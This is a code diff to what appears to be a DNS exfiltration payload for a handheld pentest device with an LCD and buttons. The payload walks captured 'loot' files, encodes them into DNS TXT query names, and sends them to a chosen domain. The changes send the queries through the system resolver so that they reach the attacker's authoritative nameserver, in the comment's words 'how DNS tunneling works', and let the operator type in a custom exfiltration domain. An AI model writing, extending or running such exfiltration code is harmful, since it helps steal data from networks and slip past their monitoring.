@@ -40,6 +40,7 @@ import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 from payloads._display_helper import ScaledDraw, scaled_font
 from payloads._input_helper import get_button
+from payloads._keyboard_helper import lcd_keyboard
 
 PINS = {
     "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
@@ -144,7 +145,7 @@ def _scan_loot_files():
     for root, _dirs, files in os.walk(LOOT_BASE):
         for fname in files:
             fpath = os.path.join(root, fname)
-            if fpath.startswith(CONFIG_DIR):
+            if fpath.startswith(CONFIG_DIR) or fpath.startswith(LOOT_DIR):
                 continue
             try:
                 size = os.path.getsize(fpath)
@@ -179,9 +180,29 @@ def _build_query_name(seq, total, file_hash, encoded_data, domain):
     return full
 
 
-def _send_dns_query(qname):
-    """Send a TXT DNS query using socket (stdlib only)."""
+def _get_system_dns():
+    """Get the system's primary DNS server from /etc/resolv.conf."""
+    try:
+        with open("/etc/resolv.conf") as f:
+            for line in f:
+                if line.strip().startswith("nameserver"):
+                    return line.split()[1]
+    except Exception:
+        pass
+    return "8.8.8.8"
+
+
+def _send_dns_query(qname, server=None):
+    """Send a TXT DNS query to the network's DNS resolver.
+
+    Uses the system DNS by default — this ensures queries follow the
+    normal resolution chain (local DNS → recursive → authoritative NS
+    of the attacker's domain), which is how DNS tunneling works.
+    """
     import socket
+
+    if server is None:
+        server = _get_system_dns()
 
     try:
         buf = bytearray()
@@ -200,7 +221,7 @@ def _send_dns_query(qname):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(2)
         try:
-            sock.sendto(bytes(buf), ("8.8.8.8", 53))
+            sock.sendto(bytes(buf), (server, 53))
             sock.recv(512)
         except socket.timeout:
             pass
@@ -392,10 +413,21 @@ def main():
                 time.sleep(0.3)
 
             elif btn == "KEY1":
-                domain_idx = (domain_idx + 1) % len(PRESET_DOMAINS)
-                current_domain = PRESET_DOMAINS[domain_idx]
-                _save_config()
-                _show_message("Domain:", current_domain[:20])
+                domain_idx = (domain_idx + 1) % (len(PRESET_DOMAINS) + 1)
+                if domain_idx < len(PRESET_DOMAINS):
+                    current_domain = PRESET_DOMAINS[domain_idx]
+                    _save_config()
+                    _show_message("Domain:", current_domain[:20])
+                else:
+                    # Custom domain input
+                    custom = lcd_keyboard(LCD, font, PINS, GPIO,
+                                          title="Domain", default=current_domain,
+                                          charset="url")
+                    if custom:
+                        current_domain = custom
+                        _save_config()
+                        _show_message("Custom:", current_domain[:20])
+                    domain_idx = 0
                 time.sleep(0.2)
 
             elif btn == "UP":
